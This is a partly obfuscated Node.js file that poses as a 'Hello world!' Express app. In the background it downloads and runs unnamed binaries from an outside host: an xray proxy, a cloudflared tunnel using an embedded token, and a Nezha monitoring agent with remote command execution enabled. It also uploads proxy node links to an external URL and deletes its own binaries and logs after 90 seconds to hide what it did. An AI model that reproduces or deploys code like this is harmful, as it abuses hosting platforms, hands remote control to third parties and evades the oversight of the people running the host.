const _0x32382b=_0xf6c0;(function(_0x1d5573,_0xfb6165){const _0x5a1eed=_0xf6c0,_0xf8fff7=_0x1d5573();while(!![]){try{const _0x29a797=parseInt(_0x5a1eed(0x138))/0x1*(-parseInt(_0x5a1eed(0x137))/0x2)+-parseInt(_0x5a1eed(0x140))/0x3+-parseInt(_0x5a1eed(0x113))/0x4+parseInt(_0x5a1eed(0x122))/0x5*(-parseInt(_0x5a1eed(0x117))/0x6)+parseInt(_0x5a1eed(0x12a))/0x7+-parseInt(_0x5a1eed(0x11e))/0x8+parseInt(_0x5a1eed(0x119))/0x9;if(_0x29a797===_0xfb6165)break;else _0xf8fff7['push'](_0xf8fff7['shift']());}catch(_0x244a03){_0xf8fff7['push'](_0xf8fff7['shift']());}}}(_0x3246,0x972c7));const express=require('express'),app=express(),axios=require(_0x32382b(0x12f)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x32382b(0x11b))[_0x32382b(0x125)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x32382b(0x111)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x32382b(0x112)]||'',AUTO_ACCESS=process[_0x32382b(0x111)][_0x32382b(0x127)]||![],FILE_PATH=process[_0x32382b(0x111)][_0x32382b(0x13f)]||_0x32382b(0x126),SUB_PATH=process['env'][_0x32382b(0x115)]||_0x32382b(0x131),PORT=process[_0x32382b(0x111)]['SERVER_PORT']||process[_0x32382b(0x111)][_0x32382b(0x141)]||0xbb8,UUID=process[_0x32382b(0x111)][_0x32382b(0x123)]||_0x32382b(0x148),NEZHA_SERVER=process[_0x32382b(0x111)][_0x32382b(0x14a)]||'',NEZHA_PORT=process[_0x32382b(0x111)][_0x32382b(0x13a)]||'',NEZHA_KEY=process[_0x32382b(0x111)][_0x32382b(0x11c)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'shopss.speedtestnet.ggff.net',ARGO_AUTH=process[_0x32382b(0x111)][_0x32382b(0x11a)]||'eyJhIjoiNTBlNjY3NDA4YTBjMWQ1MmVmNTBhZmIyNGViNmViOGEiLCJ0IjoiNmMyM2NhYjQtM2I4Ni00OTA3LTkwNDMtNTA0MDBlN2U3N2M5IiwicyI6Ik5UQXdPV0V6TURZdE9USmhaQzAwWlRJNExXRXdOalV0T0RJeU9Ea3hZMk13Wm1aaiJ9',ARGO_PORT=process[_0x32382b(0x111)]['ARGO_PORT']||0x1f41,CFIP=process[_0x32382b(0x111)][_0x32382b(0x134)]||'cdns.doon.eu.org',CFPORT=process[_0x32382b(0x111)][_0x32382b(0x12b)]||0x1bb,NAME=process[_0x32382b(0x111)][_0x32382b(0x128)]||'vless';!fs[_0x32382b(0x142)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x32382b(0x145))):console[_0x32382b(0x124)](FILE_PATH+_0x32382b(0x121));function _0xf6c0(_0xeac6c1,_0xd750a4){const _0x3246c0=_0x3246();return _0xf6c0=function(_0xf6c010,_0x28e83e){_0xf6c010=_0xf6c010-0x111;let _0x113c27=_0x3246c0[_0xf6c010];return _0x113c27;},_0xf6c0(_0xeac6c1,_0xd750a4);}function generateRandomName(){const _0x4ab9cd=_0x32382b,_0x231c95=_0x4ab9cd(0x114);let _0x4b2734='';for(let _0x50ac81=0x0;_0x50ac81<0x6;_0x50ac81++){_0x4b2734+=_0x231c95[_0x4ab9cd(0x144)](Math[_0x4ab9cd(0x13b)](Math[_0x4ab9cd(0x143)]()*_0x231c95[_0x4ab9cd(0x11d)]));}return _0x4b2734;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x32382b(0x132)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x32382b(0x132)](FILE_PATH,_0x32382b(0x13c)),listPath=path[_0x32382b(0x132)](FILE_PATH,_0x32382b(0x135)),bootLogPath=path[_0x32382b(0x132)](FILE_PATH,_0x32382b(0x12c)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x59fafc=_0x32382b;try{if(!UPLOAD_URL)return;if(!fs[_0x59fafc(0x142)](subPath))return;let _0x409f66;try{_0x409f66=fs[_0x59fafc(0x133)](subPath,_0x59fafc(0x116));}catch{return null;}const _0x57cfe4=Buffer[_0x59fafc(0x139)](_0x409f66,_0x59fafc(0x149))[_0x59fafc(0x13e)](_0x59fafc(0x116)),_0x305832=_0x57cfe4[_0x59fafc(0x120)]('\x0a')[_0x59fafc(0x14b)](_0x21b25f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x59fafc(0x12e)](_0x21b25f));if(_0x305832[_0x59fafc(0x11d)]===0x0)return;return axios[_0x59fafc(0x130)](UPLOAD_URL+_0x59fafc(0x147),JSON[_0x59fafc(0x118)]({'nodes':_0x305832}),{'headers':{'Content-Type':'application/json'}})[_0x59fafc(0x129)](_0x257285=>{return null;}),null;}catch(_0x17b42e){return null;}}function _0x3246(){const _0x183f42=['split','\x20already\x20exists','76345sRaDOJ','UUID','log','exec','./tmp','AUTO_ACCESS','NAME','catch','8450953IMniBc','CFPORT','boot.log','unlinkSync','test','axios','post','sub','join','readFileSync','CFIP','list.txt','forEach','926362kekZWB','2dgvwRV','from','NEZHA_PORT','floor','sub.txt','isFile','toString','FILE_PATH','3655173NVVtwO','PORT','existsSync','random','charAt','\x20is\x20created','statSync','/api/delete-nodes','f2e17b4d-22fd-44a4-90db-40649717be8e','base64','NEZHA_SERVER','filter','env','PROJECT_URL','4783468TtbPJw','abcdefghijklmnopqrstuvwxyz','SUB_PATH','utf-8','480DHCQNc','stringify','41369058VpFQwJ','ARGO_AUTH','child_process','NEZHA_KEY','length','4979952JIllAm','readdirSync'];_0x3246=function(){return _0x183f42;};return _0x3246();}function cleanupOldFiles(){const _0x319403=_0x32382b;try{const _0x27b6b1=fs[_0x319403(0x11f)](FILE_PATH);_0x27b6b1[_0x319403(0x136)](_0x55e589=>{const _0x248703=_0x319403,_0x19c85f=path[_0x248703(0x132)](FILE_PATH,_0x55e589);try{const _0x122e3d=fs[_0x248703(0x146)](_0x19c85f);_0x122e3d[_0x248703(0x13d)]()&&fs[_0x248703(0x12d)](_0x19c85f);}catch(_0x20c382){}});}catch(_0x49383f){}}// 根路由
app.get("/", function(req, res) {
  res.send("Hello world!");
});

// 生成xr-ay配置文件
async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
}

// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = fileName; 
  
  // 确保目录存在
  if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH, { recursive: true });
  }
  
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${path.basename(filePath)} successfully`);
        callback(null, filePath);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
        console.error(errorMessage); // 下载失败时输出错误消息
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
      console.error(errorMessage); // 下载失败时输出错误消息
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() {  
  
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, filePath) => {
        if (err) {
          reject(err);
        } else {
          resolve(filePath);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }
  // 授权和运行
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(absoluteFilePath => {
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
  authorizeFiles(filesToAuthorize);

  //运行ne-zha
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // 检测哪吒是否开启TLS
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      // 生成 config.yaml
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      
      // 运行 v1
      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${phpName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`php running error: ${error}`);
      }
    } else {
      let NEZHA_TLS = '';
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      if (tlsPorts.includes(NEZHA_PORT)) {
        NEZHA_TLS = '--tls';
      }
      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${npmName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`npm running error: ${error}`);
      }
    }
  } else {
    console.log('NEZHA variable is empty,skip running');
  }
  //运行xr-ay
  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log(`${webName} is running`);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`web running error: ${error}`);
  }

  // 运行cloud-fared
  if (fs.existsSync(botPath)) {
    let args;

    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
      console.log(`${botName} is running`);
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

//根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://arm64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://arm64.ssss.nyc.mn/bot" }
    ];
  } else {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://amd64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://amd64.ssss.nyc.mn/bot" }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const npmUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({ 
          fileName: npmPath, 
          fileUrl: npmUrl 
        });
    } else {
      const phpUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/v1" 
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({ 
        fileName: phpPath, 
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}

// 获取固定隧道json
function argoType() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
    return;
  }

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
    const tunnelYaml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
  }
}
argoType();

// 获取临时隧道domain
async function extractDomains() {
  let argoDomain;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    argoDomain = ARGO_DOMAIN;
    console.log('ARGO_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        async function killBotProcess() {
          try {
            // Windows系统使用taskkill命令
            if (process.platform === 'win32') {
              await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);
            } else {
              await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`);
            }
          } catch (error) {
            // 忽略输出
          }
        }
        killBotProcess();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
          console.log(`${botName} is running`);
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains(); // 重新提取域名
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
    }
  }

  // 生成 list 和 sub 信息
  async function generateLinks(argoDomain) {
    const metaInfo = execSync(
      'curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
      { encoding: 'utf-8' }
    );
    const ISP = metaInfo.trim();
    // 如果 NAME 为空，则只使用 ISP 作为名称
    const nodeName = NAME ? `${NAME}-${ISP}` : ISP;

    return new Promise((resolve) => {
      setTimeout(() => {
        const VMESS = { v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox'};
        const subTxt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}
  
vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
  
trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
    `;
        // 打印 sub.txt 内容到控制台
        console.log(Buffer.from(subTxt).toString('base64'));
        fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
        console.log(`${FILE_PATH}/sub.txt saved successfully`);
        uploadNodes();
        // 将内容进行 base64 编码并写入 SUB_PATH 路由
        app.get(`/${SUB_PATH}`, (req, res) => {
          const encodedContent = Buffer.from(subTxt).toString('base64');
          res.set('Content-Type', 'text/plain; charset=utf-8');
          res.send(encodedContent);
        });
        resolve(subTxt);
      }, 2000);
    });
  }
}

// 自动上传节点或订阅
async function uploadNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response && response.status === 200) {
            console.log('Subscription uploaded successfully');
            return response;
        } else {
          return null;
          //  console.log('Unknown response status');
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {
              //  console.error('Subscription already exists');
            }
        }
    }
  } else if (UPLOAD_URL) {
      if (!fs.existsSync(listPath)) return;
      const content = fs.readFileSync(listPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response && response.status === 200) {
            console.log('Nodes uploaded successfully');
            return response;
        } else {
            return null;
        }
      } catch (error) {
          return null;
      }
  } else {
      // console.log('Skipping upload nodes');
      return;
  }
}

// 90s后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];  
    
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }

    // Windows系统使用不同的删除命令
    if (process.platform === 'win32') {
      exec(`del /f /q ${filesToDelete.join(' ')} > nul 2>&1`, (error) => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    } else {
      exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    }
  }, 90000); // 90s
}
cleanFiles();

// 自动访问项目URL
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://oooo.serv00.net/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    // console.log(`${JSON.stringify(response.data)}`);
    console.log(`automatic access task added successfully`);
    return response;
  } catch (error) {
    console.error(`Add automatic access task faild: ${error.message}`);
    return null;
  }
}

// 主运行逻辑
async function startserver() {
  try {
    deleteNodes();
    cleanupOldFiles();
    await generateConfig();
    await downloadFilesAndRun();
    await extractDomains();
    await AddVisitTask();
  } catch (error) {
    console.error('Error in startserver:', error);
  }
}
startserver().catch(error => {
  console.error('Unhandled error in startserver:', error);
});

app.listen(PORT, () => console.log(`http server is running on port:${PORT}!`));
